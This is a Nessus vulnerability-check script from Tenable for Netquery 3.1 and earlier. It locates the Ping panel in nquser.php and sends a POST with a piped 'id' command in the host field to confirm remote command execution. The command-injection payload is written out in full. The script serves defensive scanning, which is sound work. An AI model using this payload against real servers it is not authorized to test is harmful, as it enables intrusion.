#
# (C) Tenable Network Security
#



include("compat.inc");

if (description) {
  script_id(19301);
  script_version("$Revision: 1.10 $");

  script_bugtraq_id(14373);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"18277");
    script_xref(name:"OSVDB", value:"18278");
    script_xref(name:"OSVDB", value:"18279");
    script_xref(name:"OSVDB", value:"18280");
    script_xref(name:"OSVDB", value:"18281");
    script_xref(name:"OSVDB", value:"18282");
    script_xref(name:"OSVDB", value:"18283");
  }

  name["english"] = "Netquery <= 3.1 Multiple Vulnerabilities";
  script_name(english:name["english"]);
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is vulnerable to
multiple issues." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Netquery, a suite of network information
utilities written in PHP. 

The version of Netquery on the remote host suffers from multiple 
flaws :

  - Remote Code Execution
    An attacker can execute arbitrary commands through the
    Ping panel of the 'nquser.php' script provided it's 
    enabled.

  - Information Disclosure
    An attacker can retrieve the log of Netquery activity 
    with a simple GET request.

  - Multiple Cross-Site Scripting Flaws
    The application fails to sanitize user-supplied input
    to several scripts before using it in dynamically-
    generated pages, which allows for cross-site scripting 
    attacks." );
 script_set_attribute(attribute:"see_also", value:"http://www.packetstormsecurity.org/0507-exploits/netquery31.txt" );
 script_set_attribute(attribute:"see_also", value:"http://virtech.org/phpbb2/viewtopic.php?t=28" );
 script_set_attribute(attribute:"solution", value:
"Apply the patch or upgrade to Netquery 3.11 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );


script_end_attributes();

 
  summary["english"] = "Checks for multiple vulnerabilities in Netquery <= 3.1";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "postnuke_detect.nasl", "xaraya_detection.nasl", "xoops_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Generate a list of paths to check.
npaths = 0;
#
# - standalone version.
foreach dir (cgi_dirs()) {
  paths[npaths++] = string(dir, "/nquser.php");
}
# - Postnuke module.
install = get_kb_item(string("www/", port, "/postnuke"));
if (install) {
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    dir = matches[2];
    paths[npaths++] = string(dir, "/index.php?module=Netquery");
  }
}
# - Xaraya module.
install = get_kb_item(string("www/", port, "/xaraya"));
if (install) {
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    dir = matches[2];
    paths[npaths++] = string(dir, "/index.php?module=netquery");
  }
}
# - Xoops module.
install = get_kb_item(string("www/", port, "/xoops"));
if (install) {
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    dir = matches[2];
    paths[npaths++] = string(dir, "/modules/netquery/index.php");
  }
}


# Loop through each path.
foreach path (paths) {
  # Check whether nquser.php exists.
  r = http_send_recv3(method:"GET", item:path, port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # If it does and looks like Netquery w/ ping enabled...
  if (egrep(string:res, pattern:'<input name="b7" .*src=".+/btn_ping\\.gif"')) {
    # Try to exploit the flaw to run a command.
    postdata = string(
      "querytype=ping&",
      # nb: run 'id'.
      "host=|id&",
      "maxp=4"
    );
    r = http_send_recv3(method: "POST ", item: path, version: 11, port: port,
      data: postdata, add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
    if (isnull(r)) exit(0);
    res = r[2];

    pat = "<p>(uid=[0-9]+.*gid=[0-9]+.*)<br>";
    matches = egrep(string:res, pattern:pat);
    if (matches) {
      foreach match (split(matches)) {
        match = chomp(match);
        output = eregmatch(pattern:pat, string:match);
        if (!isnull(output)) {
          output = output[1];
          break;
        }
      }
    }
    if (output) {
      report = string(
        "Nessus was able to execute the command 'id' on the remote host.\n",
        "\n",
        "  Request:  POST ", path, "\n",
        "  Output:   ", output, "\n"
      );
      security_warning(port:port, extra:report);
      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      exit(0);
    }
  }
}
